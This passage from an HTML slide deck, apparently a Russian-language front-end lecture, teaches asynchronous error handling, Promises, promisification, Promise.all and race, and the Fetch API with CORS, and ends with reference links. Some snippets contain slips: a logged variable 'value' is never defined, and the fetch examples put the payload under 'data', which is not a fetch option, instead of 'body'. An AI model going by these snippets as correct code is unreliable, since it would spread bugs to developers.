		<code> </code>
		<code>function onLoadUser (err, resp2) {</code>
		<code>    if (err) { return console.error(err); }</code>
		<code>    http.get(`/photos/${resp2.avatarId}`, <mark>onLoadAvatar</mark>);</code>
		<code>}</code>
		<code> </code>
	</pre>
</section>

<section class="slide">
    <h2>Try, catch</h2>
    <p class="medium-content"></p>
    <pre class="hljs js">
		<code>try {</code>
		<code>    // Выбрасываем исключение вручную</code>
  		<code>    throw 'Ooops!';</code>
		<code>} catch (err) {</code>
		<code>    alert(err); // Привет, я ошибка!</code>
		<code>}</code>
		<code> </code>
	</pre>
</section>

<section class="slide">
    <h2>Асинхронные ошибки</h2>
    <pre class="hljs js">
		<code>try {</code>
		<code>    http.get('/user', function (err) {</code>
		<code>        if (err) {</code>
		<code>            throw err;</code>
		<code>        }</code>
		<code>        console.log('User is', user);</code>
		<code>    });</code>
		<code>} catch (err) {</code>
		<code>    alert(err); // Не выполнится</code>
		<code>}</code>
		<code> </code>
	</pre>
</section>

<section class="slide">
    <h2>Асинхронные ошибки</h2>
    <pre class="hljs js">
		<code>const callback = function (err) {</code>
		<code>    if (err) {</code>
		<code>        throw err;</code>
		<code>    }</code>
		<code>    console.log('User is', user);</code>
		<code>};</code>
		<code> </code>
		<code>try {</code>
		<code>    http.get('/user', callback);</code>
		<code>} catch (err) {</code>
		<code>    alert(err); // Не выполнится</code>
		<code>}</code>
		<code> </code>
	</pre>
</section>

<section class="slide">
    <!--
    рассказ про то когда и зачем придумали Promise
    -->
    <h2>Futures или Promises</h2>
    <p class="small-content">Термин <mark>promise</mark> был предложен в 1976 году Дэниэлом Фридманом и Дэвидом Вайзом, а Питер Хиббард назвал его <mark>eventual</mark>. Похожая концепция под названием <mark>future</mark> была предложена в 1977 году в статье Генри Бейкера и Карла Хьюитта</p>
</section>

<section class="slide">
    <!--
    В переводе с иностранного "Promise" означет "Обещание".

    Аналогия про вопросы о времени:
    - Я могу спросить кого-нибудь о том который час - это "синхронный" вызов
    - Я могу попросить сказать мне когда пройдет 5 минут - это будет "callback"
    - Я могу попросить а затем сказать всем что этот человек ОБЕЩАЛ
      сказать когда пройдет 5 минут - обещание

    Т.е. обещание это отдельная сущность, которой можно поделиться с другими
    -->
    <h2>Что такое Promise?</h2>
    <div style="position:relative;width: 100%; height: 75%;">
        <img class="place" src="promise.jpg" style="transform-origin: center;transform: translate(-50%,-50%) scale(0.8);">
    </div>
</section>

<section class="slide">
    <h2>Promise</h2>
    <blockquote>
        <p><b>Promise (обещание)</b> &mdash; представляет собой обертку для значения, неизвестного на момент создания обещания</p>
    </blockquote>
    <p class="note">Он позволяет обрабатывать результаты асинхронных операций так, как если бы они были синхронными: вместо конечного результата асинхронного метода возвращается обещание получить результат в некоторый момент в будущем</p>
</section>

<section class="slide">
    <h2>Promise</h2>
    <blockquote>
        <p><b>Promises (промисы)</b> &mdash; это специальные объекты, которые могут находиться в одном из трёх состояний:
        <ul>
            <li>вначале <strong>pending</strong> («ожидание»)</li>
            <li>затем либо <strong>fulfilled</strong> («выполнено успешно»)</li>
            <li>либо <strong>rejected</strong> («выполнено с ошибкой»)</li>
        </ul>
        </p>
    </blockquote>
    <div style="position:relative;width: 100%; height: 40%;">
        <img class="place" src="promiseInit.png" style="transform-origin: center;transform: translate(-50%,-50%) scale(1.6);">
    </div>
</section>

<section class="slide">
    <h2>Promise</h2>
    <pre class="hljs js">
		<code>const promise = new Promise(function(resolve, reject) {</code>
		<code>    // Здесь можно выполнять любые действия</code>
		<code> </code>
		<code>    // вызов resolve(result) переведёт промис в состояние <mark>fulfilled</mark></code>
		<code>    // вызов reject(error) переведёт промис в состояние <mark>rejected</mark></code>
		<code>});</code>
		<code> </code>
		<code>// Можно создать сразу "готовый" промис</code>
		<code>const fulfilled = Promise.resolve(result);</code>
		<code>// const fulfilled = new Promise((resolve, _) => resolve(result));</code>
		<code>const rejected = Promise.reject(error);</code>
		<code>// const rejected = new Promise((_, reject) => reject(error));</code>
		<code> </code>
	</pre>
</section>

<section class="slide">
    <h2>Promise</h2>
    <p>Основной способ взаимодействия с промисом это регистрация функций обратного вызова для получения конечного результата промиса или сообщения о причине, по которой он не был выполнен. Иными словами, на промисы можно навесить два коллбека:</p>
    <ul>
        <li><code>onFulfilled</code> &mdash; срабатывают, когда promise находится в состоянии «выполнен успешно»</li>
        <li><code>onRejected</code> &mdash; срабатывают, когда promise находится в состоянии «выполнен с ошибкой»</li>
    </ul>
</section>

<section class="slide">
    <h2>Promise</h2>
    <pre class="hljs js">
		<code>const promise = new Promise( ... );</code>
		<code> </code>
		<code>// Можно навесить их одновременно</code>
		<code>promise.then(onFulfilled, onRejected);</code>
		<code> </code>
		<code>// Можно по отдельности</code>
		<code>// Только обработчик onFulfilled</code>
		<code>promise.then(onFulfilled);</code>
		<code>// Только обработчик onRejected</code>
		<code>promise.then(null, onRejected);</code>
		<code>promise.catch(onRejected); // Или так</code>
		<code> </code>
	</pre>
</section>

<section class="slide">
    <h2>Promise</h2>
    <pre class="hljs js">
		<code>const promise = new Promise(function(resolve, reject) {</code>
		<code>    // do smth</code>
		<code>    resolve('success'); // or</code>
		<code>    // reject(new Error('failure'));</code>
		<code>});</code>
		<code> </code>
		<code>promise</code>
		<code>    <mark>.then</mark>(res => console.log(res))</code>
		<code>    <mark>.catch</mark>(err => console.error(err));</code>
		<code> </code>
	</pre>
</section>

<section class="slide">
    <!--
    Этот небольшой трюк дарит нам много возможностей
    для организации нашего асинхронного кода

    Перечисляю и рассказываю первые три пункта, на последнем скипаю к след слайду
    -->
    <h2>Какая польза от промисов?</h2>
    <p class="small-content"></p>
    <ul>
        <li>Можно навешивать несколько обработчиков-колбэков</li>
        <li>Можно навесить обработчик-колбэк потом</li>
        <li>Можно передавать промисы в качестве аргументов в другие части системы</li>
        <li>Можно строить цепочки асинхронных вызовов без callback hell</li>
    </ul>
</section>

<section class="slide">
    <h2>Добавление нескольких коллбэков</h2>
    <pre class="hljs js">
		<code>// 'cb1 success', 'cb2 success'</code>
		<code>const promise = Promise.resolve('success');</code>
		<code> </code>
		<code>promise.then(res => { console.log('cb1', res); }); // 1</code>
		<code>promise.then(res => { console.log('cb2', res); }); // 2</code>
		<code> </code>
	</pre>
</section>

<section class="slide">
    <h2>Чейнинг промисов</h2>
    <pre class="hljs js">
		<code>// 'value 1', 'value 2', 'value 3'</code>
		<code>const promise = Promise.resolve('value 1');</code>
		<code> </code>
		<code>const p2 = promise</code>
		<code>    .then(res => { console.log(res); return 'value 2'; }) // 1</code>
		<code>    .then(res => { console.log(res); return 'value 3'; }) // 2</code>
		<code>    .then(res => { console.log(res); });                  // 3</code>
		<code> </code>
		<code>p2 === promise // false</code>
		<code> </code>
	</pre>
</section>

<section class="slide">
    <h2>Обработка асинхронных ошибок</h2>
    <pre class="hljs js">
		<code>// 'value 1', 'Error!', 'Error catched!'</code>
		<code>const promise = Promise.resolve('value 1');</code>
		<code> </code>
		<code>promise</code>
		<code>    .then(res => { console.log(res); throw 'Error!'; })             // 1</code>
		<code>    .then(res => { console.log('foo'); })</code>
		<code>    .then(res => { console.log('bar'); })</code>
		<code>    .then(res => { console.log('baz'); })</code>
		<code>    .catch(err => { console.error(err); return 'Error catched!'; }) // 2</code>
		<code>    .then(res => { console.log(res); });                            // 3</code>
		<code> </code>
	</pre>
</section>

<section class="slide">
    <h2>Из промиса можно возвращать<br/>промис!</h2>
    <pre class="hljs js">
		<code>// 'foo', 'baz', 'bar', 'foobar'</code>
		<code>const promise1 = Promise.resolve('foo')</code>
		<code>    .then(res => { console.log(res); return 'bar'; });    // foo</code>
		<code> </code>
		<code>const promise2 = Promise.resolve('baz')</code>
		<code>    .then(res => { console.log(res); <mark>return promise1</mark>; })  // baz</code>
		<code>    .then(res => { console.log(res); return 'foobar'; })  // bar</code>
		<code>    .then(res => { console.log(res); });                  // foobar</code>
		<code> </code>
	</pre>
</section>

<section class="slide">
    <h2>Промисификация</h2>
    <blockquote>
        <p>Оборачивание <strong>асинхронного функционала</strong> в функцию, возвращающую промис</p>
    </blockquote>
    <pre class="hljs js">
		<code>function PromiseGet(url) {</code>
		<code>    return new Promise(function (resolve, reject) {</code>
		<code>        http.Get(url, function (err, response) {</code>
		<code>            if (err) { reject(err) }</code>
		<code>            resolve(response);</code>
		<code>        });</code>
		<code>    });</code>
		<code>}</code>
		<code> </code>
	</pre>
</section>

<section class="slide">
    <h2>Callback Hell!</h2>
    <pre class="hljs js">
		<code>http.post('/signup', user, function (err, resp1) {</code>
		<code>    if (err) { return console.error(err); }</code>
		<code>    http.get(`/users/${resp1.id}`, function (err, resp2) {</code>
		<code>        if (err) { return console.error(err); }</code>
		<code>        http.get(`/photos/${resp2.avatarId}`, function (err, avatar) {</code>
		<code>            if (err) { return console.error(err); }</code>
		<code>            // ... callback hell!</code>
		<code>        });</code>
		<code>    });</code>
		<code>});</code>
		<code> </code>
	</pre>
</section>

<section class="slide">
    <h2><s>Callback Hell!</s> Красота :)</h2>
    <pre class="hljs js">
		<code>PromisePost('/signup', user)</code>
		<code>    .then(resp1 => PromiseGet(`/users/${resp1.id}`))</code>
		<code>    .then(resp2 => PromiseGet(`/photos/${resp2.avatarId}`))</code>
		<code>    .then(avatar => { ... })</code>
		<code>    .catch(err => console.error(err));</code>
		<code> </code>
	</pre>
</section>

<section class="slide">
    <h2><code>Promise.all</code></h2>
    <pre class="hljs js">
		<code>// Делаем что-нибудь асинхронное и важное параллельно</code>
		<code>Promise.all([</code>
		<code>	  PromiseGet('/user/1'),</code>
		<code>	  PromiseGet('/user/2'),</code>
		<code>]).then(function(users) {</code>
		<code>	  // Результатом станет массив из значений всех промисов</code>
		<code>	  users.forEach(function(user, i) {</code>
		<code>	  	  console.log(`User #${i}: ${value}`);</code>
		<code>	  });</code>
		<code>});</code>
		<code> </code>
	</pre>
</section>

<section class="slide">
    <h2><code>Promise.race</code></h2>
    <pre class="hljs js">
		<code>// Делаем что-нибудь асинхронное и важное наперегонки!</code>
		<code>Promise.race([</code>
		<code>	  promiseSomething(),</code>
		<code>	  promiseSomethingElse()</code>
		<code>]).then(function(result) {</code>
		<code>	  // Результатом станет значение самого "быстрого" промиса</code>
		<code>	  console.log(`Result: ${value}`);</code>
		<code>});</code>
		<code> </code>
	</pre>
</section>

<section class="slide">
    <h2>Fetch API</h2>
    <blockquote>
        <p>
            Метод <mark>fetch</mark> &mdash; это <mark>XMLHttpRequest</mark> нового поколения.
            Он предоставляет улучшенный интерфейс для осуществления запросов к серверу:
            как по части возможностей и контроля над происходящим,
            так и по синтаксису, так как построен на <b>промисах</b>
        </p>
    </blockquote>
	<pre class="hljs js">
		<code>// Синтаксис метода fetch:</code>
		<code>const fetchPromise = fetch(url[, options]);</code>
	</pre>
</section>

<section class="slide">
    <h2>Fetch API options</h2>
	<ul>
		<li><code>method</code> &mdash; метод запроса</li>
		<li><code>headers</code> &mdash; заголовки запроса (объект)</li>
		<li><code>body</code> &mdash; тело запроса: <code>FormData</code>, <code>Blob</code>, строка и т.п.</li>
		<li><code>mode</code> &mdash; одно из: «same-origin», «no-cors», «cors», указывает, в каком режиме кросс-доменности предполагается делать запрос</li>
		<li><code>credentials</code> &mdash; одно из: «omit», «same-origin», «include», указывает, пересылать ли куки и заголовки авторизации вместе с запросом</li>
		<li><code>cache</code> &mdash; одно из «default», «no-store», «reload», «no-cache», «force-cache», «only-if-cached», указывает, как кешировать запрос</li>
	</ul>
</section>

<section class="slide">
	<h2>Fetch API</h2>
	<pre class="hljs js">
		<code>fetch('/books', {</code>
		<code>	method: 'POST',</code>
		<code>	mode: 'cors',</code>
		<code>	credentials: 'include',</code>
		<code>	data: JSON.stringify({</code>
		<code>		title: 'Изучение Фронтенда',</code>
		<code>		authors: [</code>
		<code>			'Анатолий Остапенко', 'Дмитрий Дорофеев',</code>
		<code>			'Марина Титова', 'Артур Удалов', 'Алексей Тюльдюков'</code>
		<code>		]</code>
		<code>	})</code>
		<code>});</code>
		<code> </code>
	</pre>
</section>

<section class="slide">
	<h2>ВАЖНО: работа с CORS в Fetch API</h2>
	<pre class="hljs js">
		<code>fetch('/books', {</code>
		<code>	method: 'POST',</code>
		<code>	<mark>mode: 'cors',</mark></code>
		<code>	<mark>credentials: 'include',</mark></code>
		<code>	data: JSON.stringify({</code>
		<code>		title: 'Изучение Фронтенда',</code>
		<code>		authors: [</code>
		<code>			'Анатолий Остапенко', 'Дмитрий Дорофеев',</code>
		<code>			'Марина Титова', 'Артур Удалов', 'Алексей Тюльдюков'</code>
		<code>		]</code>
		<code>	})</code>
		<code>});</code>
		<code> </code>
	</pre>
</section>

<!--закончили с Promise и Fetch API-->

<section class="slide">
    <h2>Полезные ссылки</h2>
    <ul lang="en">
        <li>Same-origin policy описано <a
                href="https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy" target="_blank">здесь
            (MDN)</a> и
            <a href="https://en.wikipedia.org/wiki/Same-origin_policy" target="_blank">здесь (wiki)</a></li>
        <li>Метода обхода Same-origin policy <a
                href="http://stackoverflow.com/questions/3076414/ways-to-circumvent-the-same-origin-policy"
                target="_blank">stackoverflow</a></li>
        <li>Iframe: <a href="https://webref.ru/html/iframe" target="_blank">WebReference.ru</a> и <a
                href="https://learn.javascript.ru/same-origin-policy" target="_blank">learn.javascript.ru</a></li>
        <li>Кроссдоменные запросы на <a href="https://learn.javascript.ru/xhr-crossdomain" target="_blank">learn.javascript.ru</a>
        </li>
        <li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Access_control_CORS" target="_blank">Описание</a>
            HTTP access control (CORS)
        </li>
        <li>Документация к <strong>Spring</strong> про CORS: <a
                href="https://spring.io/blog/2015/06/08/cors-support-in-spring-framework" target="_blank">здесь</a></li>
        <li>API (application programming interface) <a
                href="https://en.wikipedia.org/wiki/Application_programming_interface" target="_blank">wiki</a></li>
        <li>Документирование API с помощью <a href="http://swagger.io/" target="_blank">swagger</a>, <a
                href="https://apiary.io/" target="_blank">apiary</a> или <a href="https://apiblueprint.org/"
                                                                            target="_blank">apiblueprint</a></li>
    </ul>
</section>

<section class="slide">
    <h2>Полезные ссылки</h2>
    <ul lang="en">
        <li>Семантический API: <a href="https://en.wikipedia.org/wiki/Create,_read,_update_and_delete" target="_blank">CRUD</a>
            и
            <a href="http://www.ibm.com/developerworks/ru/library/ws-restfu/" target="_blank">REST</a></li>
        <li>Тестирование JavaScript <a href="https://jasmine.github.io/" target="_blank">с помощью Jasmine</a></li>
        <li>Очень подробные посты, про Promise на <a href="https://learn.javascript.ru/promise" target="_blank">learn.javascript.ru</a>
            и на
            <a href="https://habrahabr.ru/post/209662/" target="_blank">хабре</a></li>
        <li><a href="https://learn.javascript.ru/fetch" target="_blank">Fetch API</a></li>
    </ul>
</section>

<section class="slide">
    <h2 class="shout">Всем спасибо!</h2>
</section>

<div class="progress"></div>
<script src="/lib/shower/shower.min.js"></script>
<script src="/lib/hljs/highlight.pack.js"></script>
<script>hljs.initHighlightingOnLoad();</script>

<script src="/reload/reload.js"></script>

</body>
</html>
